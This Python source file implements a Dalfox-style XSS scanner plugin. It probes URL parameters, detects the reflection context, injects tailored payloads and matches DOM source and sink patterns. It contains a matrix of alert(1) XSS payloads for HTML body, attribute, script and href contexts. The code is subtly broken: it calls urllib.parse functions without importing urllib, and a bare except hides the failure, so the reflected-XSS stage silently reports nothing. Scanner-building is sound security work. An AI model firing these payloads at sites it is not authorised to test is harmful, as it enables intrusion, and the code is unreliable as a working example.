"""
Dalfox-Inspired Layered XSS Scanner Engine v6.0.

Implements the Dalfox XSS methodology pipeline:
  1. Parameter Discovery & Mining
  2. Special-Character Probing (`"<'>()`)
  3. Reflection Analysis
  4. Context Detection (HTML Text, Attribute, Script, Comment, Href)
  5. Context-Specific Tailored Payload Generation
  6. DOM Source-to-Sink Static Reasoning
  7. Empirical Verification & Evidence Capture

CWE-79 | CVSS 6.1 | OWASP A03:2021 Injection
"""

import re
import random
import string
from urllib.parse import urlparse, parse_qs
from core.http_client import get
from core.response_analyzer import diff_responses, calculate_confidence, make_finding, is_in_executable_context
from core.utils import inject_into_params

PLUGIN_CWE = 79
PLUGIN_CVSS = 6.1
PLUGIN_OWASP = "A03:2021 Injection"

# Special character probe to test escaping behavior
PROBE_CHARS = 'dalfox"\'<>'

# Context-Specific Payload Matrices (Dalfox Philosophy)
CONTEXT_PAYLOADS = {
    "html_body": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
    ],
    "attribute_double_quote": [
        '" onmouseover="alert(1)"',
        '"><img src=x onerror=alert(1)>',
        '" autofocus onfocus="alert(1)',
    ],
    "attribute_single_quote": [
        "' onmouseover='alert(1)'",
        "'><img src=x onerror=alert(1)>",
        "' autofocus onfocus='alert(1)",
    ],
    "script_context": [
        "';alert(1)//",
        '";alert(1)//',
        "</script><script>alert(1)</script>",
    ],
    "href_context": [
        "javascript:alert(1)",
        '"><script>alert(1)</script>',
    ],
}

# DOM XSS Sources and Sinks
DOM_SOURCES = [
    r'location\.hash', r'location\.search', r'document\.URL',
    r'document\.referrer', r'window\.name', r'location\.href',
    r'document\.cookie', r'URLSearchParams',
]

DOM_SINKS = [
    r'document\.write\(', r'\.innerHTML\s*=', r'eval\(',
    r'setTimeout\(', r'setInterval\(', r'\.outerHTML\s*=',
    r'\.insertAdjacentHTML\(', r'jQuery\.html\(',
]


class DalfoxXSSEngine:
    """Layered XSS engine following Dalfox methodology."""

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.canary = "dfx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

    def run_xss_pipeline(self) -> list:
        """Execute full Dalfox XSS pipeline."""
        findings = []

        # ── Step 1: Parameter Discovery / Probing ──
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return findings

        # ── Step 2: Special-Character Probing ──
        for param in params:
            probe_val = f"{self.canary}{PROBE_CHARS}"
            probe_url = self._craft_url(param, probe_val)

            try:
                r = get(probe_url, timeout=5)
                if r is None or self.canary not in r.text:
                    continue  # Parameter not reflected at all

                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" not in ct:
                    continue

                body = r.text

                # ── Step 3: Reflection Analysis & Context Detection ──
                reflected_chars = [c for c in PROBE_CHARS if f"{self.canary}" in body and c in body.split(self.canary)[1][:20]]
                if not reflected_chars:
                    continue

                context = self._detect_reflection_context(self.canary, body)
                if not context:
                    continue

                # ── Step 4: Context-Specific Payload Injection ──
                tailored_payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["html_body"])

                for payload in tailored_payloads:
                    inj_val = f"{self.canary}{payload}"
                    inj_url = self._craft_url(param, inj_val)
                    inj_resp = get(inj_url, timeout=5)

                    if inj_resp is None or self.canary not in inj_resp.text:
                        continue

                    # ── Step 5: Executable Context Verification ──
                    if is_in_executable_context(inj_val, inj_resp.text):
                        signals = {
                            "reflection": True,
                            "reflection_context": True,
                            "verified": True,
                        }
                        confidence = calculate_confidence(signals)

                        finding = make_finding(
                            self.target_url, "Cross-Site Scripting (Reflected - Dalfox Engine)",
                            confidence=confidence, signals=signals,
                            details=f"Dalfox XSS pipeline confirmed unescaped execution in '{context}' context via param '{param}'.",
                            severity="High", payload=payload, parameter=param,
                            evidence=f"Reflected unescaped in context: {context}",
                        )
                        if finding:
                            finding["cwe"] = PLUGIN_CWE
                            finding["cvss"] = PLUGIN_CVSS
                            finding["owasp"] = PLUGIN_OWASP
                            findings.append(finding)
                            break  # Move to next param once confirmed

            except Exception:
                continue

        # ── Step 6: DOM XSS Source-to-Sink Reasoning ──
        dom_finding = self._check_dom_xss()
        if dom_finding:
            findings.append(dom_finding)

        return findings

    def _detect_reflection_context(self, canary: str, body: str) -> str:
        """Detect the exact HTML context where canary is reflected."""
        canary_pos = body.find(canary)
        if canary_pos == -1:
            return ""

        snippet = body[max(0, canary_pos - 100):min(len(body), canary_pos + 100)]

        if "<script" in snippet.lower() and "</script>" not in snippet.lower():
            return "script_context"
        if "href=" in snippet.lower():
            return "href_context"
        if '="' in snippet or '="' in snippet.replace(canary, ''):
            return "attribute_double_quote"
        if "='" in snippet or "='" in snippet.replace(canary, ''):
            return "attribute_single_quote"
        return "html_body"

    def _check_dom_xss(self) -> dict:
        """Analyze client-side JS for complete Source -> Sink data flow."""
        try:
            r = get(self.target_url, timeout=5)
            if r is None or "text/html" not in r.headers.get("Content-Type", "").lower():
                return None

            body = r.text

            found_sources = [s for s in DOM_SOURCES if re.search(s, body, re.I)]
            found_sinks = [s for s in DOM_SINKS if re.search(s, body, re.I)]

            if found_sources and found_sinks:
                signals = {
                    "reflection": True,
                    "reflection_context": True,
                    "multi_signal": True,
                }
                confidence = calculate_confidence(signals)

                finding = make_finding(
                    self.target_url, "DOM-Based Cross-Site Scripting",
                    confidence=confidence, signals=signals,
                    details=f"DOM XSS Source-to-Sink data flow detected. Sources: {', '.join(found_sources[:2])}; Sinks: {', '.join(found_sinks[:2])}",
                    severity="High", payload="Client-Side DOM Flow",
                    evidence=f"Source: {found_sources[0]} -> Sink: {found_sinks[0]}",
                )
                if finding:
                    finding["cwe"] = PLUGIN_CWE
                    finding["cvss"] = PLUGIN_CVSS
                    finding["owasp"] = PLUGIN_OWASP
                    return finding
        except Exception:
            pass
        return None

    def _craft_url(self, param: str, val: str) -> str:
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [val]
        flat_params = {k: v[0] for k, v in params.items()}
        new_query = urllib.parse.urlencode(flat_params)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
